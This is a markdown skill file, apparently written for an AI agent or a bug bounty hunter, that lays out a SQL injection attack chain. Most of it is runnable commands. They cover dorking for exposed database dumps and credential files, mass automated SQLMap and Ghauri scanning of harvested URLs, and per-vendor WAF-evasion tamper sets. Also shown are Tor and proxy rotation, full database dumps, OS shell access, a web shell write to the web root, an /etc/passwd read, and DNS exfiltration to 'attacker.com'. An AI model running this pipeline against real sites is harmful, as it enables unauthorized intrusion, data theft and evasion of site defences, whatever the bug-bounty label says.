---
name: "sql-injection"
version: "2.0"
category: "injection"
subcategory: "sqli"
phase: "exploitation"
tags: ["bug-bounty", "injection", "sqli", "database", "sqlmap", "ghauri"]
tools: ["sqlmap", "ghauri", "gf", "gau", "katana", "waymore", "subfinder", "httpx", "uro"]
follow_up_skills: ["rce", "ssrf", "xss", "path-traversal", "remote-code-execution", "information-disclosure-harvesting", "exposed-source-code-recovery"]
prerequisite_skills: ["recon-subdomain", "recon-endpoint"]
description: "Bug bounty skill: sql injection - exploitation phase, injection category"
---
# SQL Injection (SQLi)

## Summary

SQL Injection remains one of the most impactful web vulnerabilities. This covers the full attack chain: Google dorking, subdomain recon, endpoint discovery, GF filtering, mass automation with SQLMap/Ghauri, WAF evasion (tamper scripts, junk data, origin IP), and data extraction.

## Key Concepts

- **Trigger detection**: Inject `'` and `"` into parameters — if the server returns a database error or unexpected behavior, SQLi is likely confirmed. Always follow up with SQLMap for automated exploitation.

- **SQLi Attack Chain**: Google Dorking → Recon → Endpoint Discovery → GF Filtering → Mass Automation → WAF Bypass → Data Extraction.
- **GF (Gf-Patterns)**: Regex-based tool to filter URLs likely vulnerable to SQLi from a large URL list.
- **Ghauri**: Lightweight SQLi exploitation framework optimized for blind, time-based, and WAF-protected targets.
- **Tamper Scripts**: SQLMap modules that obfuscate payloads to evade WAF detection engines.

## Technical Details

### Part 0: Advanced Google Dorking for SQLi Recon

**Find URLs with Query Parameters:**
```
site:*.domain.com inurl:id=
site:*.domain.com inurl:product.php?id=
site:*.domain.com inurl:view.php?page=
site:*.domain.com inurl:item.php?cat=
site:*.domain.com ext:php
site:*.domain.com ext:asp
site:*.domain.com ext:aspx
site:*.domain.com ext:jsp
```

**Error-Based Fingerprinting:**
```
# MySQL
intext:"You have an error in your SQL syntax"
intext:"Warning: mysql_"

# PostgreSQL
intext:"PostgreSQL query failed: ERROR"

# MSSQL
intext:"Microsoft OLE DB Provider for SQL Server"
intext:"Unclosed quotation mark after the character string"

# Oracle
intext:"ORA-00933: SQL command not properly ended"
intext:"ORA-01756: quoted string not properly terminated"
```

**Exposed Database Dumps:**
```
site:example.com ext:sql | ext:db | ext:dbf | ext:bak | ext:old | ext:backup
intitle:"index of" "db.sql"
site:example.com "db_password" ext:txt | ext:cfg | ext:ini
```

**Dork Automation Tools:**
```bash
git clone https://github.com/opsdisk/pagodo
python3 pagodo.py -d example.com -g dorks.txt -l 50 -s
```

### Part 1: Reconnaissance

```bash
subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|jspx|aspx'

# Passive collection
subfinder -d example.com -all -silent -o subfinder.txt
assetfinder --subs-only example.com > assetfinder.txt
amass enum -passive -d example.com -o amass_passive.txt
findomain -t example.com -u findomain.txt
chaos -d example.com > chaos.txt
cat *.txt | sort -u > all_subdomains.txt

# Probe live hosts
cat all_subdomains.txt | httpx-toolkit -mc 200 -sc -td -title -server -silent | grep -Ei 'asp|php|jsp|jspx|aspx' > live_hosts.txt
```

### Part 2: Endpoint Discovery

```bash
# GAU
echo https://example.com | gau --threads 50 | uro | grep -E "\.php|\.asp|\.aspx|\.jsp|\.jspx" | grep "=" > urls1.txt

# Katana
echo https://example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | uro | grep -E "\.php|\.asp|\.aspx|\.jsp|\.jspx" > urls2.txt

# Waymore
waymore -i https://example.com -mode U | grep -E "\.php|\.asp|\.aspx|\.jsp|\.jspx" | grep "=" > urls_waymore.txt

# Combine all
cat urls1.txt urls2.txt urls_waymore.txt google_dork_urls.txt | sort -u > all_urls.txt
```

### Part 3: GF Pattern Filtering

```bash
go install github.com/tomnomnom/gf@latest
cp -r ~/go/src/github.com/tomnomnom/gf/examples ~/.gf
git clone https://github.com/1ndianl33t/Gf-Patterns ~/gf-patterns
cp ~/gf-patterns/*.json ~/.gf

cat all_urls.txt | gf sqli | uro > sqli_candidates.txt

# One-liner
subfinder -d example.com -all -silent | gau --threads 50 | uro | gf sqli > sql.txt
```

### Part 4: Mass Automation

```bash
# Ghauri
ghauri -m sqli_candidates.txt --batch --dbs --level 3 --confirm

# SQLMap
sqlmap -m sqli_candidates.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs

# Complete pipeline
subfinder -d example.com -all -silent | gau --threads 50 | uro | gf sqli > sql.txt && ghauri -m sql.txt --batch --dbs --level 3 --confirm
subfinder -d example.com -all -silent | gau | urldedupe | gf sqli > sql.txt && sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent
```

### Part 5: SQLMap Deep Dive & WAF Bypass

**Essential SQLMap Commands:**
```bash
# Bulk URLs
sqlmap -m urls.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --drop-set-cookie --threads 10 --dbs

# Tor mode
sqlmap -r request.txt --time-sec=10 --tor --tor-type=SOCKS5 --dbs --batch

# Burp mode
sqlmap -r request.txt --level 3 --risk 2 --random-agent --time-sec=30 --proxy https://127.0.0.1:8080 --thread=10 --dbs

# JSON-based SQLi
sqlmap -u 'vulnerable_url' --data '{"User":"admin","Pwd":"admin@123"}' --random-agent --ignore-code 403 --dbs --hex

# Database enumeration
sqlmap -u 'url' --dbs
sqlmap -u 'url' -D database_name --tables
sqlmap -u 'url' -D database_name -T table_name --columns
sqlmap -u 'url' -D database_name -T table_name -C col1,col2 --dump

# Advanced extraction
--dump-all --threads=10 --hex --no-cast

# Cookie/session
--cookie="PHPSESSID=..." --headers="X-Forwarded-For: 127.0.0.1" --csrf-token=token --random-agent

# OS access
--os-shell --os-pwn
--file-read=/etc/passwd
--file-write=shell.php --file-dest=/var/www/html/shell.php

# OOB exfiltration
--dns-domain=attacker.com --os-shell --technique=O

# Header abuse
--headers="X-Original-URL: /vuln.php" --method=PUT --param-del=";"

# Forms
sqlmap -u https://target.com/registration --dbs --forms --crawl=2 --batch

# Ignore blocked codes
sqlmap -r request.txt --level=5 --risk=3 --no-cast --force-ssl --ignore-code=500 --dbs
```

**WAF-Specific Tamper Combinations:**
```
# ModSecurity, Cloudflare, F5 ASM
--tamper=between,randomcase,space2comment

# ModSecurity, Imperva SecureSphere
--tamper=space2comment,space2morehash

# Cloudflare, Akamai, Sucuri
--tamper=space2comment,between,randomcase,charencode

# PHP WAFs, Wordfence, LiteSpeed
--tamper=space2comment,randomcase,unmagicquotes

# Imperva, Barracuda
--tamper=space2comment,between,percentage

# Cloudflare, F5 ASM, Radware
--tamper=charencode,randomcase,space2comment

# Akamai, Sucuri, StackPath
--tamper=space2plus,space2comment,randomcase

# BlueCoat / Symantec WAF
--tamper=space2comment,between,randomcase,bluecoat

# F5 ASM, Citrix NetScaler
--tamper=space2comment,between,randomcase,equaltolike

# FortiWeb, Legacy ModSecurity
--tamper=space2comment,randomcase,overlongutf8
```

**Evasion Tips:**
```bash
--ignore-code=401,403    # Don't stop on WAF blocks
proxychains sqlmap ...   # IP rotation via residential proxies
--dbms=mysql             # Explicit DBMS = less noise, faster
--risk=2 --level=3       # Balanced aggressiveness
--hex                     # Hex-encode payloads
--null-connection --keep-alive  # Minimize detection surface
--no-cast                 # Disable CAST operations
```

### Part 6: Ghauri — Next-Gen SQLi Tool

**Key Strengths**: Optimized for blind/time-based, modular, effective against Cloudflare/Akamai, built-in obfuscation, async request handling.

```bash
# Basic scan
ghauri -u "vulnerable_url" --dbs --batch

# Via request file
ghauri -r request.txt -p txt_user_id --dbs --batch --level 3

# Bulk URLs
ghauri -m urls.txt --batch --dbs --level 3 --threads 10

# JSON/API
ghauri -u 'vulnerable_url' --data '{"User":"test","Pwd":"test@123"}' --random-agent

# WAF bypass
ghauri -u 'vulnerable_url' --batch --dbs --level 3 --dbms mysql --confirm --time-sec 10 --delay 5
ghauri -u 'vulnerable_url' --dbs --batch --level 3 --dbms mysql --tech=T --confirm --time-sec 10 --delay 5

# Advanced opts
--prefix "')/**/" --suffix "--+" --skip-urlencode --confirm
```

### Fortinet WAF Bypass — Junk Data Overload

Send >1KB of garbage data in the request body to exceed the WAF's inspection buffer, causing it to pass the request without full analysis.

### Second-Order SQL Injection

Inject payload into one request (e.g., registration name) — it executes when another function reads and queries the stored value:
```bash
sqlmap -u "https://target.com/profile" --second-url "https://target.com/profile" --data "name=test*"
```

### Out-of-Band (OOB) SQL Injection

Use when no response-based output is visible:
```bash
sqlmap -u "https://target.com/page?id=1" --dns-domain=attacker.com --technique=O
```

### HTTP Parameter Pollution (HPP)

Sending multiple parameters with the same name to confuse WAF/backend parsing:
```
/page?id=1&id=2&id=3
```

### JSON-Based SQL Injection

```bash
sqlmap -u 'https://target.com/api/search' --data '{"search":"test*","limit":10}' --random-agent --ignore-code=403 --dbs
```

### Full Automation Pipeline

```bash
# ========== PHASE 1: SUBDOMAIN RECON ==========
subfinder -d example.com -all -silent | httpx-toolkit -td -sc -silent | grep -Ei 'asp|php|jsp|aspx' > live_hosts.txt
# ========== PHASE 2: ENDPOINT DISCOVERY ==========
cat live_hosts.txt | gau --threads 50 | uro | grep -E "\.php|\.aspx|\.jsp" | grep "=" > urls.txt
# ========== PHASE 3: MERGE WITH GOOGLE DORK URLS ==========
cat urls.txt google_dork_urls.txt | sort -u > all_urls.txt
# ========== PHASE 4: GF FILTERING ==========
cat all_urls.txt | gf sqli | uro > sqli_candidates.txt
# ========== PHASE 5: MASS AUTOMATION ==========
ghauri -m sqli_candidates.txt --batch --dbs --level 3 --confirm
sqlmap -m sqli_candidates.txt --batch --random-agent --tamper=space2comment --level=5 --risk=3 --dbs
# ========== PHASE 6: IF BLOCKED – ADD TAMPER ==========
sqlmap -m sqli_candidates.txt --batch --tamper=between,randomcase,space2comment --ignore-code=403 --dbs
# ========== PHASE 7: ORIGIN IP ATTACK (last resort) ==========
# Find origin IP, add to /etc/hosts, then:
sqlmap -u "http://target.com/page?id=1" --dbs --batch
```

## Methodology

1. **Google Dorking**: Find vulnerable endpoints and error pages via search engines.
2. **Recon**: Find subdomains and live hosts (filter by dynamic extensions).
3. **Endpoint Discovery**: Gather URLs with parameters (GAU, Katana, Waymore).
4. **GF Filtering**: Extract SQL-prone endpoints using GF patterns.
5. **Mass Automation**: Test hundreds of URLs with SQLMap and Ghauri.
6. **WAF Bypass**: Use tamper scripts, junk data, and origin IP attacks.
7. **Data Extraction**: Dump databases efficiently.

### Cookie-Based SQLi

Cookies are a frequently overlooked injection vector. Intercept the request and modify cookie values with SQL payloads. Certain characters (`;`, `,`) may act as delimiters in cookies and break the injection — use URL encoding for these.

```
Cookie: sessionId=xxx' order by 1#     (Normal — no error)
Cookie: sessionId=xxx' order by 2#     (Error — column mismatch)

# Automated testing via sqlmap
sqlmap -u "https://target.com/page" --cookie="sessionId=xxx" -p sessionId --dbs
```

The `-p` flag targets the cookie parameter specifically. SQLMap automatically handles cookie-based injection.

## Payloads

```
# Second-order SQLi indicator
name=test*   # Inject in registration, trigger in profile

# HPP
/page?id=1&id=2&id=3

# JSON body SQLi
{"search":"test*","limit":10}
```

## Commands

```bash
# Full automated pipeline
subfinder -d example.com -all -silent | gau --threads 50 | uro | gf sqli > sql.txt && ghauri -m sql.txt --batch --dbs --level 3 --confirm
subfinder -d example.com -all -silent | gau | urldedupe | gf sqli > sql.txt && sqlmap -m sql.txt --batch --dbs --risk 2 --level 5 --random-agent
```

## Tools

- **SQLMap** — Industry-standard SQLi automation
- **Ghauri** — Lightweight SQLi tool for blind/WAF-hardened targets
- **GF / Gf-Patterns** — Regex URL filtering for SQLi candidates
- **GAU** — Get all URLs (Wayback, CommonCrawl, URLScan, OTX)
- **Katana** — Deep web crawling
- **Waymore** — Alternative URL harvester
- **Subfinder / Amass / Findomain / Assetfinder / Chaos** — Subdomain discovery
- **httpx-toolkit** — Live host probing with tech detection
- **uro** — URL deduplication
- **Pagodo / GoogD0rker / DorkGenius** — Google dork automation

## Bypass Techniques

- **Tamper Scripts**: space2comment, between, randomcase, charencode, bluecoat, equaltolike, overlongutf8 — per-WAF combinations.
- **Junk Data Overload**: Send >1KB garbage to exceed WAF inspection buffer (Fortinet bypass).
- **Origin IP Attack**: Bypass Cloudflare/WAF by finding origin IP and targeting it directly.
- **HPP (HTTP Parameter Pollution)**: Send multiple same-name params to confuse WAF.
- **JSON Body Injection**: WAFs often miss SQLi in JSON POST bodies.
- **Second-Order Injection**: Inject into one request, trigger in another.
- **OOB Exfiltration**: Use DNS/HTTP channel when no direct response is visible.
- **Header Abuse**: X-Original-URL, method override, custom param delimiters.
- **Tor/Proxy Rotation**: Bypass IP-based blocking via proxychains + residential proxies.

## Notes

- Test both GET and POST — don't ignore POST parameters.
- Mix payloads into JSON bodies, XML, headers, and cookies.
- Monitor 5xx errors, long delays, and unusual behavior — even without data extraction, these indicate injection.
- For time-based blind, increase `--time-sec` to 10+ and add `--delay`.
- Always use `--flush-session` when changing tamper scripts.
- Ghauri performs particularly well against JavaScript-driven apps and cloud WAFs.
- Second-order SQLi is frequently missed by automated scanners.

## References

- https://medium.com/@0xSilent/the-ultimate-sql-injection-attack-chain-from-recon-to-mass-automation-waf-evasion-60c038bda28a
- https://github.com/opsdisk/pagodo
- https://github.com/tomnomnom/gf
- https://github.com/1ndianl33t/Gf-Patterns
- https://github.com/projectdiscovery/katana
- https://github.com/lc/gau

## SQLMap Reference

# SQLMap Explained: How It Works, GET and POST Testing, WAF Bypass

## Summary

SQLMap is an open-source Python tool that automates detection and exploitation of SQL injection vulnerabilities. This guide covers its internal detection pipeline, GET/POST testing methods, WAF bypass techniques using tamper scripts, data extraction, and the conditions required to escalate SQL injection to Remote Code Execution (RCE).

## Key Concepts

- **Boolean-based blind**: SQLMap sends true/false conditions and compares responses for behavioral differences
- **Error-based**: Forces the database to throw visible SQL errors that leak information
- **Union-based**: Uses UNION SQL operator to pull data into visible output
- **Time-based blind**: Uses database pause payloads (e.g., `SLEEP()`) to confirm injection when no visible difference exists
- **Stacked queries**: Chains a second query after the original using a semicolon
- **Tamper scripts**: Modify payloads on-the-fly to evade WAF pattern matching
- **Level vs Risk**: Level controls number of payloads/test points (1-5); Risk controls payload danger level (1-3)

## Technical Details

### How SQLMap Works Under the Hood

1. **Baseline recording** — sends original request and records status code, response length, response time, content
2. **Payload injection** — tests different injection techniques (boolean, error, union, time-based, stacked queries)
3. **Database fingerprinting** — identifies MySQL, PostgreSQL, MSSQL, Oracle, SQLite, etc.
4. **Data extraction** — extracts database names, tables, columns, data, user, privileges

### Detection Techniques

- Boolean-based blind
- Error-based
- Union-based
- Time-based blind
- Stacked queries

## Methodology

### Testing a Simple GET Request

```python
python sqlmap.py -u "http://target.com/product.php?id=1"
python sqlmap.py -u "http://target.com/product.php?id=1" -p id
python sqlmap.py -u "http://target.com/product.php?id=1" --cookie="PHPSESSID=abc123xyz"
```

### Testing a POST Request

```python
python sqlmap.py -r request.txt
python sqlmap.py -u "http://target.com/login.php" --data="username=admin&password=test123"
python sqlmap.py -u "http://target.com/login.php" --data="username=admin&password=test123" -p username
```

### Combining GET and POST

```python
python sqlmap.py -u "http://target.com/search.php?category=1" --data="query=phone&sort=price"
```

### Testing Headers and Cookies

```python
python sqlmap.py -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 1*"
python sqlmap.py -u "http://target.com/page.php?id=1" --cookie="session=abc*"
```

The `*` tells SQLMap exactly where to inject within the value.

### Level and Risk Settings

```python
python sqlmap.py -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

- Level 1-5: higher = more payloads and test points (includes headers/cookies)
- Risk 1-3: higher = more dangerous payloads (OR-based, UPDATE/DELETE affecting)

### WAF Identification

```python
python sqlmap.py -u "http://target.com/page.php?id=1" --identify-waf
```

Identifies Cloudflare, Akamai, ModSecurity, Imperva, etc.

### Data Extraction

```python
python sqlmap.py -u "http://target.com/page.php?id=1" --dbs
python sqlmap.py -u "http://target.com/page.php?id=1" -D databasename --tables
python sqlmap.py -u "http://target.com/page.php?id=1" -D databasename -T tablename --columns
python sqlmap.py -u "http://target.com/page.php?id=1" -D databasename -T tablename -C username,password --dump
python sqlmap.py -u "http://target.com/page.php?id=1" --current-user --privileges
```

### RCE via SQL Injection

```python
python sqlmap.py -u "http://target.com/page.php?id=1" --os-shell
python sqlmap.py -u "http://target.com/page.php?id=1" --os-cmd="whoami"
```

#### MySQL RCE Path
- Requires FILE privilege and unrestricted `secure_file_priv`
- SQLMap writes a PHP web shell to web root using `INTO OUTFILE`

#### MSSQL RCE Path
- Uses `xp_cmdshell` stored procedure
- SQLMap can enable it via `sp_configure` if priveleges allow

#### PostgreSQL RCE Path
- Uses large objects or COPY command with superuser privileges to write files to disk

### Realistic Workflow

1. Capture request in Burp (GET or POST with all headers/cookies)
2. Save as request file and run with `-r`
3. Run `--identify-waf` if WAF suspected, then layer tamper scripts and slow request rate
4. Check current user and privileges before destructive actions
5. Only attempt `--os-shell` or `--os-cmd` if privileges support it and with authorization

### Setup

```sh
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --version
python sqlmap.py --update
```

## Payloads

No specific payloads provided beyond what SQLMap generates internally via its tamper scripts.

## Commands

```sh
# Setup
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --version
python sqlmap.py --update

# GET testing
python sqlmap.py -u "http://target.com/product.php?id=1"
python sqlmap.py -u "http://target.com/product.php?id=1" -p id
python sqlmap.py -u "http://target.com/product.php?id=1" --cookie="PHPSESSID=abc123xyz"

# POST testing
python sqlmap.py -r request.txt
python sqlmap.py -u "http://target.com/login.php" --data="username=admin&password=test123"
python sqlmap.py -u "http://target.com/login.php" --data="username=admin&password=test123" -p username

# Combined GET + POST
python sqlmap.py -u "http://target.com/search.php?category=1" --data="query=phone&sort=price"

# Headers and cookies
python sqlmap.py -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 1*"
python sqlmap.py -u "http://target.com/page.php?id=1" --cookie="session=abc*"

# Level and risk
python sqlmap.py -u "http://target.com/page.php?id=1" --level=5 --risk=3

# WAF bypass
python sqlmap.py -u "http://target.com/page.php?id=1" --tamper=space2comment
python sqlmap.py -u "http://target.com/page.php?id=1" --tamper=space2comment,between,randomcase
python sqlmap.py -u "http://target.com/page.php?id=1" --identify-waf
python sqlmap.py -u "http://target.com/page.php?id=1" --delay=2 --random-agent --tamper=space2comment

# Data extraction
python sqlmap.py -u "http://target.com/page.php?id=1" --dbs
python sqlmap.py -u "http://target.com/page.php?id=1" -D databasename --tables
python sqlmap.py -u "http://target.com/page.php?id=1" -D databasename -T tablename --columns
python sqlmap.py -u "http://target.com/page.php?id=1" -D databasename -T tablename -C username,password --dump
python sqlmap.py -u "http://target.com/page.php?id=1" --current-user --privileges

# RCE
python sqlmap.py -u "http://target.com/page.php?id=1" --os-shell
python sqlmap.py -u "http://target.com/page.php?id=1" --os-cmd="whoami"
```

## Tools

- **SQLMap** — Open-source SQL injection automation tool
- **Burp Suite** — Used to capture and save requests
- **QSReplace** — Parameter replacement for bulk URL testing
- **LinkFinder** — Extracts URLs and parameters from JavaScript files
- **FFUF** — Fuzzing tool for parameter discovery

## Bypass Techniques

### Tamper Scripts

| Tamper Script | Function |
|---|---|
| `space2comment` | Replaces spaces with `/**/` to bypass space-based filters |
| `between` | Replaces `>` / `<` with BETWEEN clause |
| `randomcase` | Randomizes SQL keyword casing (e.g., `SeLeCt`) to bypass exact-case filters |
| `charencode` | URL-encodes entire payload |
| `apostrophemask` | Replaces single quotes with UTF-8 full-width equivalents |
| `equaltolike` | Replaces `=` with LIKE operator |

### Evasion Techniques
- `--delay=2` — Adds pause between requests to avoid rate-based detection
- `--random-agent` — Rotates User-Agent header on each request
- Layering multiple tamper scripts for tougher WAFs

## Notes

- RCE is not guaranteed from SQL injection — it depends on database engine, user privileges, and server configuration
- Most well-configured cloud apps have restricted DB privileges, FILE permission disabled, xp_cmdshell locked down, and non-writable web root
- A confirmed SQL injection with data dump is still critical/high severity on its own
- Level 5 tests headers and cookies as injection points
- Risk 3 includes payloads that can modify data — use only with proper authorization
- Always keep SQLMap updated (`--update`) as WAF behaviors and database engines change
- Understanding manual SQL injection makes you far better at using automated tools

## References

- https://osintteam.blog/sqlmap-explained-how-it-works-get-and-post-testing-waf-bypass-d69f08e6c49e
- https://github.com/sqlmapproject/sqlmap
